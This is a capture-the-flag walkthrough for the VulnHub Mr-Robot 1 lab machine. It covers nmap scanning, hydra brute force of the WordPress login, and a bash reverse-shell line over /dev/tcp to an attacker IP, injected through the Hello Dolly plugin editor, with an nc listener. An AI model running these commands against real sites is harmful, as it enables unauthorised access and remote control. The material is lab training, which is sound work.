## Mr-Robot : 1

- **Mr-Robot : 1** :-

- Download the machine : [https://www.vulnhub.com/entry/mr-robot-1,151/](https://www.vulnhub.com/entry/mr-robot-1,151/)

![file:///tmp/.K3ULS3/1.png](file:///tmp/.K3ULS3/1.png)

- Open ova file .
- Then click finish .
- Start the machine .

1. Network Scanning :

- Find the machine IP :

```sh
nmap -sn 192.168.31.0/24
```

![file:///tmp/.K3ULS3/2.png](file:///tmp/.K3ULS3/2.png)

- Find available port in the machine :

nmap -v -p- 192.168.31.157

![file:///tmp/.K3ULS3/3.png](file:///tmp/.K3ULS3/3.png)

- IP visit in browser : [http://192.168.31.157/](http://192.168.31.157/) [https://192.168.31.157/](https://192.168.31.157/)

- This command runs an aggressive scan and uses the http-enum script to identify potential CGI directories .

nmap -v -p 80 443 -sT -sV -A --script=http-enum.nse 192.168.31.157

![file:///tmp/.K3ULS3/4.png](file:///tmp/.K3ULS3/4.png)

1. Web Enumeration :

- Found URLs : [http://192.168.31.157/wp-login.php](http://192.168.31.157/wp-login.php)

![file:///tmp/.K3ULS3/5.png](file:///tmp/.K3ULS3/5.png)

[http://192.168.31.157/robots.txt](http://192.168.31.157/robots.txt)

![file:///tmp/.K3ULS3/6.png](file:///tmp/.K3ULS3/6.png)

https://192.168.31.157/fsocity.dic

http://192.168.31.157/key-1-of-3.txt

- Key download :

wget http://192.168.31.157/key-1-of-3.txt

- Check :

cat key-1-of-3.txt 

- Wordlist Download :

wget http://192.168.31.157/fsocity.dic

- Check size :

wc -l fsocity.dic

![file:///tmp/.K3ULS3/7.png](file:///tmp/.K3ULS3/7.png) Ye large password wordlist h .

1. Username Enumeration :

- Make a user file and fill the fsocity.dic file content :

nano user.txt

- Extract unique usernames from fsocity.dic :

cat user.txt | sort -u | uniq > small-user.txt

- Run hydra to find the valid username ( Username Brute Force ) :

hydra -L small-user.txt -p small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"

![file:///tmp/.K3ULS3/8.png](file:///tmp/.K3ULS3/8.png)

- Found valid username :

elliot

1. Password Brute-Force (WordPress) :

- Run hydra to find the valid password with the valid username :

hydra -l elliot -P small-user.txt 192.168.31.157 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect" -V

![file:///tmp/.K3ULS3/9.png](file:///tmp/.K3ULS3/9.png)

- Found valid password :

ER28-0652

1. Login to WordPress :

- URL : http://192.168.31.157/wp-login.php

- Then : Username : elliot Password : ER28-0652

![file:///tmp/.K3ULS3/10.png](file:///tmp/.K3ULS3/10.png)

- Login the user : [http://192.168.31.157/wp-admin/](http://192.168.31.157/wp-admin/)

1. Reverse Shell via Plugin Editor :

- Go to Plugins .
- Then Go to Editor .
- Then search Hello Dolly .

- Edit the Hello Dolly plugin and add :

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.31.206/443 0>&1'");

![file:///tmp/.K3ULS3/11.png](file:///tmp/.K3ULS3/11.png) Update the plugin.

1. Get Reverse Shell :

- Start listener on attacker machine :

nc -lvnp 443

- Go to installed plugins .
- Click the Activate .

![file:///tmp/.K3ULS3/12.png](file:///tmp/.K3ULS3/12.png)

- Then activate Hello Dolly plugin in WordPress ➝ shell is received.

![file:///tmp/.K3ULS3/13.png](file:///tmp/.K3ULS3/13.png)

```sh

```